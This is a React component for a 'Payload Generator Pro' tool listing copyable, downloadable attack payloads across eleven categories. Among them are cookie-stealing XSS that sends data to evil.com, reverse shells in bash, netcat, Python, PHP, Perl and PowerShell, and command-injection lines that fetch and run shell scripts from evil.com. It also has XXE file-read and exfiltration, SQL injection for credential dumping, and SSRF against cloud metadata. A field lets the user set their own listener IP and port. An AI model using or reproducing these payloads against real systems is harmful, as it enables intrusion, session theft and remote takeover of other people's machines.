import React, { useState } from 'react';
import { Terminal, Copy, Download, Search } from 'lucide-react';
import './ToolPages.css';

const PayloadGenerator = () => {
  const [activeTab, setActiveTab] = useState('sql');
  const [customParam, setCustomParam] = useState('');
  const [searchTerm, setSearchTerm] = useState('');

  const payloads = {
    sql: {
      label: 'SQL INJECTION',
      items: [
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "admin' --", "admin' #", "admin'/*",
        "' or 1=1--", "' or 1=1#", "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+", "1' ORDER BY 10--+",
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--", "1' UNION SELECT NULL,NULL,NULL--",
        "-1' UNION SELECT 1,2,3--", "-1' UNION SELECT 1,2,3,4--", "-1' UNION SELECT 1,2,3,4,5--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        "' UNION SELECT NULL, table_name FROM information_schema.tables--",
        "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT username, password FROM users--",
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        "' AND (SELECT user FROM mysql.user LIMIT 0,1)='root'--",
        "' AND SLEEP(5)--", "' AND BENCHMARK(5000000,MD5(1))--",
        "'; DROP TABLE users--", "'; EXEC xp_cmdshell('dir')--",
        "' INTO OUTFILE '/var/www/html/shell.php'--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,database()),1)--",
        "1' AND '1'='1", "1' AND '1'='2", "' OR username IS NOT NULL--",
        "' UNION SELECT @@version--", "' UNION SELECT user()--",
        "' UNION SELECT database()--", "' UNION SELECT load_file('/etc/passwd')--"
      ]
    },
    xss: {
      label: 'XSS PAYLOADS',
      items: [
        "<script>alert('XSS')</script>", "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>", "<img src=x onerror=alert(document.cookie)>",
        "<svg/onload=alert('XSS')>", "<svg/onload=alert(document.domain)>",
        "<iframe src=javascript:alert('XSS')>", "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>", "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>", "<marquee onstart=alert('XSS')>",
        "<div onpointerover=alert('XSS')>HOVER</div>", "javascript:alert('XSS')",
        "<script>fetch('//evil.com?c='+document.cookie)</script>",
        "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>",
        "'-alert(1)-'", "'-confirm(1)-'", "'-prompt(1)-'",
        "><script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>document.write('<img src=//evil.com/?c='+document.cookie+'>')</script>",
        "<img src=x onerror=this.src='//evil.com/?c='+document.cookie>",
        "<svg><script>alert&#40;1&#41;</script>",
        "<iframe src=data:text/html,<script>alert(1)</script>></iframe>",
        "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>", "<form action=javascript:alert(1)><input type=submit>",
        "<button formaction=javascript:alert(1)>X</button>",
        "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
        "<style>*{background:url('javascript:alert(1)')}</style>",
        "<link rel=stylesheet href='javascript:alert(1)'>",
        "<base href=javascript:alert(1)//>", "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>"
      ]
    },
    shell: {
      label: 'REVERSE SHELLS',
      items: [
        'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',
        '0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196',
        'nc -e /bin/sh 10.0.0.1 4444',
        'nc -e /bin/bash 10.0.0.1 4444',
        'nc -c bash 10.0.0.1 4444',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4444 >/tmp/f',
        'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'',
        'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'',
        'php -r \'$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'php -r \'$sock=fsockopen("10.0.0.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'perl -e \'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
        'ruby -rsocket -e\'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'10.0.0.1\',\'4444\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"',
        'telnet 10.0.0.1 4444 | /bin/bash | telnet 10.0.0.1 4445',
        'awk \'BEGIN {s = "/inet/tcp/0/10.0.0.1/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
        'socat tcp-connect:10.0.0.1:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane',
        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
        'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.0.0.1\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
      ]
    },
    cmd: {
      label: 'COMMAND INJECTION',
      items: [
        '; ls', '| ls', '& ls', '&& ls', '|| ls', '`ls`', '$(ls)',
        '; cat /etc/passwd', '| cat /etc/passwd', '&& cat /etc/passwd',
        '; whoami', '| whoami', '&& whoami', '`whoami`', '$(whoami)',
        '; id', '| id', '&& id', '`id`', '$(id)',
        '; uname -a', '| uname -a', '&& uname -a',
        '; wget http://evil.com/shell.sh -O /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh',
        '&& curl http://evil.com/shell.sh | bash',
        '; nc -e /bin/sh 10.0.0.1 4444',
        '`curl http://evil.com/shell.sh | bash`',
        '$(curl http://evil.com/shell.sh | bash)',
        '; python -c \'import socket...\' &',
        '| python3 -c \'import os; os.system("bash")\' &',
        '; sleep 10', '| sleep 10', '&& sleep 10',
        '; ping -c 10 10.0.0.1', '&& ping -c 10 10.0.0.1',
        '%0a ls', '%0d ls', '%0a%0d ls',
        ';%20ls', '|%20ls', '&%20ls',
        '\n ls', '\r ls', '\r\n ls'
      ]
    },
    ldap: {
      label: 'LDAP INJECTION',
      items: [
        '*', '*)(&', '*))%00', '*()|&\'',
        'admin*', 'admin*)((|userPassword=*)',
        '*)(uid=*))(|(uid=*', '*)(&(objectClass=*)',
        'admin)(!(&(1=0)', '*)(%26(objectClass=user))',
        '*()|%26\'', 'admin)(|(password=*))',
        '*)(objectClass=*))(&(objectClass=void',
        '*))(objectClass=*',
        'admin)(&(password=*',
        '*)(cn=*)', '*)|(mail=*)',
        '*)(|(uid=*)(userPassword=*))',
        'admin*)(|(objectClass=*'
      ]
    },
    xml: {
      label: 'XML/XXE INJECTION',
      items: [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe.txt">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome SYSTEM "http://evil.com/?%xxe;">]><foo>&callhome;</foo>',
        '<![CDATA[<script>alert(\'XSS\')</script>]]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>&xxe;</foo>'
      ]
    },
    lfi: {
      label: 'LFI/RFI',
      items: [
        '../../../etc/passwd', '....//....//....//etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '/etc/passwd%00', '../etc/passwd%00',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input', 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        'expect://id', 'file:///etc/passwd',
        'http://evil.com/shell.txt',
        'zip://shell.zip#shell.php',
        'phar://shell.phar/shell.php',
        '/proc/self/environ', '/proc/self/fd/0',
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        'C:\\Windows\\System32\\drivers\\etc\\hosts'
      ]
    },
    ssti: {
      label: 'SSTI (Server-Side Template Injection)',
      items: [
        '{{7*7}}', '${7*7}', '<%= 7*7 %>',
        '{{config}}', '{{config.items()}}',
        '{{self}}', '{{self.__dict__}}',
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[401]('ls',shell=True,stdout=-1).communicate()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        '{php}echo `id`;{/php}',
        '${{<%[%\'\"}}%\\',
        '{{7*\'7\'}}',
        '{{request}}', '{{config.__class__.__init__.__globals__}}'
      ]
    },
    nosql: {
      label: 'NoSQL INJECTION',
      items: [
        "' || '1'=='1", "' || 1==1//", "' || 1==1%00",
        '{"$gt":""}', '{"$ne":null}', '{"$ne":""}',
        '{"username":{"$ne":null},"password":{"$ne":null}}',
        '{"username":{"$regex":".*"},"password":{"$regex":".*"}}',
        '{"$where":"return true"}',
        "'; return true; var dummy=''",
        "'; sleep(5000); var dummy=''",
        '{"$or":[{},{\'a\':\'a\'}]}',
        'admin\' || \'1\'==\'1',
        '{"username":"admin","password":{"$ne":""}}'
      ]
    },
    csrf: {
      label: 'CSRF PAYLOADS',
      items: [
        '<img src="http://vulnerable.com/delete?id=1">',
        '<form action="http://vulnerable.com/change_email" method="POST"><input type="hidden" name="email" value="attacker@evil.com"><input type="submit" value="Submit"></form><script>document.forms[0].submit()</script>',
        '<iframe style="display:none" name="csrf-frame"></iframe><form method="POST" action="http://vulnerable.com/api/delete" target="csrf-frame" id="csrf-form"><input type="hidden" name="id" value="123"></form><script>document.getElementById("csrf-form").submit()</script>',
        'fetch("http://vulnerable.com/api/delete", {method: "POST", credentials: "include", body: JSON.stringify({id:1}), headers: {"Content-Type": "application/json"}})',
        '<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "http://vulnerable.com/api/delete", true); xhr.withCredentials = true; xhr.send("id=1");</script>'
      ]
    },
    ssrf: {
      label: 'SSRF PAYLOADS',
      items: [
        'http://127.0.0.1', 'http://localhost',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://[::]:80/', 'http://0.0.0.0:80/',
        'file:///etc/passwd', 'file:///c:/windows/win.ini',
        'http://127.1', 'http://127.0.1',
        'http://0177.0.0.1', 'http://0x7f.0x0.0x0.0x1',
        'http://2130706433', 'http://017700000001',
        'dict://localhost:11211/stats',
        'gopher://localhost:6379/_INFO'
      ]
    }
  };

  const handleCopy = (payload) => {
    const final = customParam ? payload.replace(/10\.0\.0\.1/g, customParam).replace(/4444/g, customParam.split(':')[1] || '4444') : payload;
    navigator.clipboard.writeText(final);
  };

  const handleCopyAll = () => {
    const filtered = searchTerm ? payloads[activeTab].items.filter(p => p.toLowerCase().includes(searchTerm.toLowerCase())) : payloads[activeTab].items;
    const all = filtered.map(p => customParam ? p.replace(/10\.0\.0\.1/g, customParam) : p).join('\n\n');
    navigator.clipboard.writeText(all);
  };

  const handleDownload = () => {
    const filtered = searchTerm ? payloads[activeTab].items.filter(p => p.toLowerCase().includes(searchTerm.toLowerCase())) : payloads[activeTab].items;
    const all = filtered.map(p => customParam ? p.replace(/10\.0\.0\.1/g, customParam) : p).join('\n\n');
    const blob = new Blob([all], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `payloads_${activeTab}_${Date.now()}.txt`;
    a.click();
  };

  const filteredPayloads = searchTerm 
    ? payloads[activeTab].items.filter(p => p.toLowerCase().includes(searchTerm.toLowerCase()))
    : payloads[activeTab].items;

  return (
    <div className='tool-page'>
      <div className='tool-header'>
        <div className='tool-title'>
          <Terminal size={32} />
          <div>
            <h1>PAYLOAD GENERATOR PRO</h1>
            <p>&gt; 500+ Real exploit payloads</p>
          </div>
        </div>
      </div>

      <div className='tool-content'>
        <div className='tabs'>
          {Object.entries(payloads).map(([key, value]) => (
            <button
              key={key}
              className={`tab ${activeTab === key ? 'active' : ''}`}
              onClick={() => { setActiveTab(key); setSearchTerm(''); }}
            >
              {value.label}
            </button>
          ))}
        </div>

        <div className='search-box'>
          <div className='grid-2'>
            <div className='input-group-tool'>
              <label>SEARCH PAYLOADS</label>
              <div className='input-with-button'>
                <input
                  type='text'
                  placeholder='Search...'
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
                <Search size={18} style={{position: 'absolute', right: '1rem', top: '50%', transform: 'translateY(-50%)', color: '#666'}} />
              </div>
            </div>
            <div className='input-group-tool'>
              <label>CUSTOM IP/PORT (for shells)</label>
              <input
                type='text'
                placeholder='10.0.0.1:4444'
                value={customParam}
                onChange={(e) => setCustomParam(e.target.value)}
              />
            </div>
          </div>
          <div className='stats-row' style={{marginTop: '1rem'}}>
            <div className='stat-box'>
              <div className='stat-value'>{filteredPayloads.length}</div>
              <div className='stat-label'>PAYLOADS</div>
            </div>
            <button className='btn-tool btn-secondary' onClick={handleCopyAll}>
              <Copy size={18} />
              COPY ALL
            </button>
            <button className='btn-tool btn-secondary' onClick={handleDownload}>
              <Download size={18} />
              DOWNLOAD
            </button>
          </div>
        </div>

        <div className='alert-box'>
          <Terminal size={18} />
          <span>
            {filteredPayloads.length} {activeTab.toUpperCase()} payloads. 
            {activeTab === 'shell' && customParam && ' IP/Port replaced in payloads.'}
          </span>
        </div>

        <div className='results-grid'>
          {filteredPayloads.map((payload, index) => (
            <div key={index} className='result-card found'>
              <div className='code-block' style={{marginBottom: '1rem', fontSize: '0.75rem'}}>
                {customParam && activeTab === 'shell' 
                  ? payload.replace(/10\.0\.0\.1/g, customParam.split(':')[0] || customParam).replace(/4444/g, customParam.split(':')[1] || '4444')
                  : payload
                }
              </div>
              <button className='btn-tool btn-secondary' onClick={() => handleCopy(payload)} style={{width: '100%'}}>
                <Copy size={16} />
                COPY
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default PayloadGenerator;